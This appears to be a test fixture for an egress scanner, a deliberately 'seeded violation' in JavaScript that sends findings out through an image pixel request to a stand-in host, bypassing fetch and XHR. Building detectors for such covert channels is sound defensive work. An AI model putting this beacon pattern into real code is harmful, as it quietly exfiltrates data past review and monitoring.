// SEEDED VIOLATION — negative control for sec-a2-egress-scan.mjs. Never executed.
// Expected sink: net-construct (Image). No fetch, no XHR, no import — the GET is
// a side effect of assigning .src, which is why the taxonomy cannot stop at the
// obvious request APIs.
export function report(findings) {
  const pixel = new Image();
  pixel.src = 'https://telemetry.example.invalid/p.gif?d=' + encodeURIComponent(JSON.stringify(findings));
}
